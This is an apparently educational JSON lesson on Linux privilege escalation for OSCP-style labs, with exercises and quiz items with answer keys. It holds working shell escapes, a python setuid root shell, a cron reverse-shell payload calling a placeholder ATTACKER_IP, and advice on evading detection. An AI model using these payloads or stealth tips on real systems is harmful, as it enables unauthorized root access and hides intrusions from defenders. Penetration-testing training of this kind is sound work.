{
  "lesson_id": "1e90a6c4-d37d-4cdf-979f-f62bc361b93f",
  "domain": "pentest",
  "title": "Linux Privilege Escalation Playbook",
  "subtitle": "Kernel, misconfigurations, and credential pivots for PWK labs",
  "difficulty": 3,
  "estimated_time": 75,
  "order_index": 26,
  "author": "CyberLearn Offensive Curriculum Team",
  "base_xp_reward": 200,
  "mastery_threshold": 82,
  "is_core_concept": true,
  "created_at": "2025-01-20T12:00:00",
  "updated_at": "2025-01-20T12:00:00",
  "version": "1.0",
  "prerequisites": [
    "Network Mapping & Host Discovery",
    "Linux Buffer Overflow Payload Orchestration"
  ],
  "concepts": [
    "Privilege escalation enumeration",
    "Linux capabilities",
    "SUID and SGID abuse",
    "Cron job hijacking",
    "Credential harvesting from /etc and memory",
    "Kernel exploit assessment",
    "Container breakout techniques",
    "OpSec for Linux escalation"
  ],
  "learning_objectives": [
    "Enumerate Linux privilege boundaries using automated and manual tooling",
    "Abuse SUID binaries, capabilities, and writable cron jobs to gain root",
    "Evaluate kernel exploit paths safely and apply mitigations",
    "Leverage password reuse and cached credentials for lateral movement",
    "Document escalation steps with remediation guidance for defenders"
  ],
  "jim_kwik_principles": [
    "Chunking",
    "Active learning"
  ],
  "content_blocks": [
    {
      "block_id": "1727b8ae-88d9-4714-9d39-f074ff1db562",
      "type": "explanation",
      "title": "Why Linux Escalation Differs",
      "content": {
        "text": "# Offensive Mindset for Linux\n\nLinux privilege escalation requires fluency with discretionary access control, capabilities, and service scripts. Unlike Windows, there is rarely a single registry to trawl; evidence hides across /etc, systemd unit files, sudoers policies, and user home directories. OSCP expects you to pivot quickly between manual inspection and automation.\n\n## Exam Expectations\n\nYou will encounter diverse distributions in PWK labs: Ubuntu LTS, Debian, CentOS, older kernels, and containerised workloads. Your process must adapt while staying disciplined. Focus on methodology rather than memorising one-off tricks.\n\n## Lesson Roadmap\n\n1. Build an enumeration baseline using LinPEAS, LinEnum, and custom scripts.\n2. Abuse SUID binaries, capabilities, and misconfigured sudo policies.\n3. Weaponise cron jobs, backups, and writable scripts.\n4. Evaluate kernel exploits responsibly.\n5. Harvest credentials and pivot through containers.\n\nKeep your notes structured by privilege boundary: filesystem, scheduled tasks, credentials, kernel."
      },
      "simplified_explanation": "Linux escalation leans on file permissions, capabilities, and scripts rather than registries.",
      "memory_aids": [
        "Method beats memorisation."
      ],
      "real_world_connection": "Modern red teams report Linux escalation weaknesses as often as Windows misconfigurations.",
      "reflection_prompt": "What is your current Linux privilege escalation checklist and where does it slow you down?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "fbdee9b2-d3b7-4911-b9bb-c0bc5edc0b90",
      "type": "explanation",
      "title": "Enumeration Baseline",
      "content": {
        "text": "# Core Recon Commands\n\nStart with contextual awareness:\n- `id`, `groups`, `whoami` for identity.\n- `uname -a`, `cat /etc/os-release` for kernel and distro.\n- `sudo -l` to reveal delegated commands.\n- `ls -la /root` to confirm goal location.\n\n## Automated Helpers\n\n- **LinPEAS**: highlights SUID binaries, writable paths, cron jobs, network services, Docker sockets.\n- **LinEnum**: summarises kernel exploit checks, file permissions, and network state.\n- **LES (Linux Exploit Suggester)**: maps kernel versions to known exploits.\n\nRun scripts with caution; review code to respect OSCP rules and avoid destructive commands.\n\n## Manual Deep Dives\n\n- Inspect `/etc/passwd` and `/etc/shadow` permissions.\n- Check `/etc/sudoers` and `/etc/sudoers.d/` for misconfigurations.\n- Review `/etc/crontab`, `/etc/cron.*`, and user crontabs for writable scripts.\n- Enumerate systemd units in `/etc/systemd/system/` looking for ExecStart directives pointing to writable locations.\n\nDocument findings in a matrix: category, command, vulnerability hypothesis, validation steps."
      },
      "simplified_explanation": "Combine automated scripts with manual inspection of sudoers, cron, and systemd.",
      "memory_aids": [
        "id \u2192 kernel \u2192 sudo \u2192 cron"
      ],
      "real_world_connection": "Pwning PWK machines quickly hinges on disciplined enumeration.",
      "reflection_prompt": "How do you ensure LinPEAS output does not overwhelm your note-taking?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "660e0db4-ff0a-49fa-9bd9-e1b4dc4498b2",
      "type": "explanation",
      "title": "SUID, Capabilities, and Sudo",
      "content": {
        "text": "# SUID and SGID Binaries\n\nSearch for binaries with setuid bits: `find / -perm -4000 -type f -ls 2>/dev/null`. Pay attention to custom binaries in `/usr/local/bin` or home directories. Test for shell escapes:\n- If binary executes shell commands, attempt `; /bin/sh` injection.\n- Use GTFOBins to identify known exploit paths.\n\n## Linux Capabilities\n\nCapabilities grant granular privileges. List them with `getcap -r / 2>/dev/null`. Dangerous examples:\n- `cap_setuid+ep` on binaries like python or perl allows spawning root shells.\n- `cap_net_bind_service+ep` combined with writable binary enabling reverse shells on privileged ports.\n\n## Sudo Misconfigurations\n\n`sudo -l` reveals delegated commands. Exploitable patterns include:\n- Running editors (vi, nano) without password.\n- Invoking tar, rsync, or find with root privileges (GTFOBins again).\n- Allowing scripts with relative paths or environment manipulation.\n\nAlways preserve logs: note `/var/log/auth.log` entries to help defenders tighten sudoers."
      },
      "simplified_explanation": "Abuse SUID binaries, capabilities, and sudo rules using GTFOBins guidance.",
      "memory_aids": [
        "SUID scan \u2192 Capabilities \u2192 sudo -l"
      ],
      "real_world_connection": "Many OSCP machines rely on sudo misconfigurations for escalation.",
      "reflection_prompt": "Which GTFOBins entries have you practised recently?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "f5863227-1cb2-4eb1-a19b-087740f28ae1",
      "type": "explanation",
      "title": "Cron Jobs, Services, and Containers",
      "content": {
        "text": "# Cron Hijacking\n\nCron jobs run as root create deterministic escalation windows. Look for:\n- Scripts in `/etc/cron.*` directories with writable permissions.\n- User crontabs executing scripts located in world-writable directories such as `/tmp` or `/home/shared`.\n- Backup scripts invoking tar or rsync without sanitized paths.\n\nInject payloads while keeping original functionality. Wait for cron execution or trigger manually if possible.\n\n## Systemd and Init Scripts\n\nExamine service unit files for writable ExecStart commands. Reload daemon and restart services carefully to avoid detection.\n\n## Containers and Namespaces\n\nIf you find Docker socket access (`/var/run/docker.sock`), you can launch privileged containers and mount host directories. For LXD, import an image with raw disk mappings to obtain root.\n\nDocument container escapes meticulously; exam proctors expect evidence of understanding the mechanism."
      },
      "simplified_explanation": "Cron jobs, systemd units, and container sockets often run as root and expose writable scripts.",
      "memory_aids": [
        "Cron \u2192 systemd \u2192 containers"
      ],
      "real_world_connection": "DevOps teams frequently leave backup jobs writable for convenience.",
      "reflection_prompt": "How do you test container privilege escalation without damaging host workloads?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "04bdf2d1-1750-4397-8404-0c186df39f53",
      "type": "code_exercise",
      "title": "Enumerating SUID Binaries",
      "content": {
        "text": "Run the following command on a lab host and categorise results:\n\n```bash\nfind / -perm -4000 -type f -printf \"%p %u %g\\n\" 2>/dev/null | sort\n```\n\nCreate a table in your notes with columns: binary, owner, GTFOBins technique, exploit status, cleanup notes. Attempt at least two escalations:\n\n1. Exploit `find` via `sudo find /tmp -exec /bin/sh \\; -quit` if delegated.\n2. Abuse `env` with `sudo env /bin/sh` when NOPASSWD is granted.\n\nReflect on which binaries triggered detection or logging."
      },
      "simplified_explanation": "List SUID files, map to GTFOBins, exploit responsibly.",
      "memory_aids": [],
      "real_world_connection": "Maintaining a personal SUID spreadsheet accelerates OSCP machines.",
      "reflection_prompt": "What automation can you build to annotate SUID findings faster?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "24d3ab71-e934-4a9a-b374-7927a5cff16b",
      "type": "code_exercise",
      "title": "Cron Job Hijack Lab",
      "content": {
        "text": "Set up a controlled cron escalation scenario:\n\n    1. On your lab VM, create `/usr/local/bin/backup.sh` owned by root but writable by your user.\n    2. Add a cron entry: `* * * * * root /usr/local/bin/backup.sh`.\n    3. Insert payload: `#!/bin/bash\n/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`.\n    4. Start a listener on your Kali host.\n    5. Wait for cron to execute, observe root shell, then restore original script.\n\n    Emphasise stealth: log to `/var/log/custom.log` to mimic real backups and ensure cleanup removes your payload."
      },
      "simplified_explanation": "Modify a root-owned cron script to spawn a reverse shell, then revert.",
      "memory_aids": [],
      "real_world_connection": "This mirrors PWK machines such as Sufferance or Organic.",
      "reflection_prompt": "How would you maintain functionality so defenders do not notice failed backups?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "c719eab0-2c9b-49a3-b4a9-13b499de1fa8",
      "type": "code_exercise",
      "title": "Capability Abuse",
      "content": {
        "text": "Practice abusing Linux capabilities:\n\n1. Grant python3 the setuid capability on a lab host: `sudo setcap cap_setuid+ep /usr/bin/python3.8`.\n2. As a low-privilege user, launch root shell:\n\n```python\nimport os\nos.setuid(0)\nos.system(\"/bin/bash\")\n```\n\n3. Remove the capability: `sudo setcap -r /usr/bin/python3.8`.\n\nExtend the lab by applying cap_net_bind_service to a custom binary and binding to port 80 without root."
      },
      "simplified_explanation": "Use capabilities like cap_setuid to turn safe binaries into root shells in lab environments.",
      "memory_aids": [],
      "real_world_connection": "Misconfigured capabilities show up in cloud workloads where developers need privileged networking.",
      "reflection_prompt": "Which monitoring controls can detect misuse of cap_setuid?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "06896950-22a2-48b4-9bef-237ae5c34426",
      "type": "real_world",
      "title": "Case Study: Containerised Finance App",
      "content": {
        "text": "A financial SaaS provider deployed microservices with Docker. A pentester compromised a developer container, discovered the Docker socket mounted inside, and launched a privileged container with the host filesystem mounted under /host. From there they extracted SSH keys and escalated to root on the host node. The incident led to a redesign: Docker socket was removed, and Kubernetes admission controllers enforced least privilege.\n\n**Takeaway:** Containers are not security boundaries; treat socket access as immediate root."
      },
      "simplified_explanation": "Docker socket exposure equals root compromise on the host.",
      "memory_aids": [
        "Docker socket == root"
      ],
      "real_world_connection": "",
      "reflection_prompt": "How would you harden container platforms to prevent this escalation?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "4d10c77d-5c23-438d-952f-649c338e855e",
      "type": "memory_aid",
      "title": "Mnemonic: ROOT MAP",
      "content": {
        "text": "Use ROOT MAP to structure Linux escalation:\n\n- **R**econ with id, uname, LinPEAS\n- **O**perate on sudoers and capabilities\n- **O**wn cron jobs and timers\n- **T**raverse writable services\n- **M**ine credentials from files and memory\n- **A**ssess kernel exploits carefully\n- **P**ivot through containers or network trusts\n\nRevisit ROOT MAP before every exam machine."
      },
      "simplified_explanation": "ROOT MAP keeps Linux escalation organised.",
      "memory_aids": [
        "R-Recon, O-Operate, O-Own, T-Traverse, M-Mine, A-Assess, P-Pivot"
      ],
      "real_world_connection": "",
      "reflection_prompt": "Which ROOT MAP stage requires the most practice in your labs?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "1015018d-10f7-4d4a-9a5f-90ce14b96cf6",
      "type": "diagram",
      "title": "Linux Escalation Flow",
      "content": {
        "text": "```\nFoothold\n  |\n  +--> id / uname / sudo -l\n  |\n  +--> LinPEAS summary\n  |\n  +--> SUID / Capabilities --> Root shell?\n  |\n  +--> Cron / systemd scripts --> Inject payload\n  |\n  +--> Credentials (shadow, backups) --> su / ssh\n  |\n  +--> Kernel exploit (as last resort)\n  |\n  +--> Containers --> Host escape\n```"
      },
      "simplified_explanation": "Follow the flow from recon to containers, using kernel exploits last.",
      "memory_aids": [
        "Escalate systematically to reduce noise."
      ],
      "real_world_connection": "",
      "reflection_prompt": "Where in this flow would you insert automated note generation?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "6e41b248-98b2-4c53-b05c-9ef1dd4270dc",
      "type": "mindset_coach",
      "title": "Stay Patient",
      "content": {
        "text": "Linux escalation rewards patience. When LinPEAS dumps 2,000 lines, breathe, chunk the output, and prioritise by impact. You are not racing scripts; you are demonstrating judgment. Break problems into ROOT MAP stages and trust the process."
      },
      "simplified_explanation": "Chunk enumeration results and trust your methodology.",
      "memory_aids": [
        "Chunk, prioritise, act."
      ],
      "real_world_connection": "High-performing OSCP candidates spend more time organising output than running exploits.",
      "reflection_prompt": "What cue will remind you to pause and regroup when enumeration feels overwhelming?",
      "is_interactive": false,
      "xp_reward": 0
    },
    {
      "block_id": "2d850763-d491-4960-83d4-deca02bf664d",
      "type": "reflection",
      "title": "Linux Escalation Retrospective",
      "content": {
        "text": "After your next lab session answer:\n\n- Which SUID or capability vectors did you test and what was the outcome?\n- Did you inspect cron, systemd, and containers thoroughly or skip due to time?\n- How did you document kernel exploit considerations and why you accepted or rejected them?\n- Which credentials did you harvest and how will you reuse them responsibly?\n- What remediation advice would you deliver to the system owner?\n\nTurn these notes into report-ready bullet points."
      },
      "simplified_explanation": "Review SUID, cron, kernel, credentials, and remediation after each lab.",
      "memory_aids": [],
      "real_world_connection": "",
      "reflection_prompt": "Which question exposed a blind spot you need to address?",
      "is_interactive": false,
      "xp_reward": 0
    }
  ],
  "post_assessment": [
    {
      "question": "Which command reveals Linux capabilities assigned to binaries and helps identify cap_setuid abuse paths?",
      "options": [
        "find / -perm -2000",
        "getcap -r / 2>/dev/null",
        "lsattr -a",
        "ldd --cap"
      ],
      "correct_answer": 1,
      "explanation": "getcap recursively lists capabilities so you can spot dangerous assignments such as cap_setuid+ep.",
      "question_id": "34ecd7a8-6781-441b-bcb3-30cdbabfa064",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "During assessment you discover a root cron job executing /usr/local/bin/backup.sh every minute. The file is writable by your user. What is the safest escalation workflow?",
      "options": [
        "Delete the cron job and create a new one pointing to your payload",
        "Append your payload to backup.sh while preserving original functionality, wait for execution, then revert",
        "Restart the cron service to force immediate execution without modifying the script",
        "Replace /bin/bash with your payload temporarily"
      ],
      "correct_answer": 1,
      "explanation": "Modifying the script while maintaining functionality respects stability and yields root when cron runs it, allowing cleanup afterward.",
      "question_id": "e22bda91-6996-4c56-a96b-53b4ab84162c",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "When should kernel exploits be attempted during OSCP-style privilege escalation?",
      "options": [
        "Immediately after obtaining a shell",
        "Only after safer misconfigurations and credential paths are exhausted and kernel version is confirmed vulnerable",
        "Whenever LinPEAS suggests any CVE",
        "Never, because OSCP forbids kernel exploits"
      ],
      "correct_answer": 1,
      "explanation": "Kernel exploits are a last resort after validating safer vectors and ensuring the target kernel matches a known vulnerable build.",
      "question_id": "5d3ee8bb-9352-474a-8430-991483c8f79d",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ]
}